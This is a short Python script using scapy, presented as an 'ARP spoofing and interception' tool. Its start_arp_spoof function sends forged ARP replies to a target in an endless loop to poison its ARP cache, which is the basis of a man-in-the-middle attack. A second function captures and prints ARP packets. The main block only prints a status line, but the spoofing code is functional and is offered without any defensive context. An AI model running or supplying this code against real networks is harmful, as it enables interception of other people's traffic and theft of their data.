# ARP spoofing and interception script
from scapy.all import ARP, sniff, send

def start_arp_spoof(target_ip, spoof_ip):
    packet = ARP(op=2, pdst=target_ip, psrc=spoof_ip)
    while True:
        send(packet, verbose=False)

def sniff_arp_packets():
    sniff(filter="arp", prn=lambda x: x.summary(), store=False)

if __name__ == "__main__":
    print("ARP Interceptor Running")
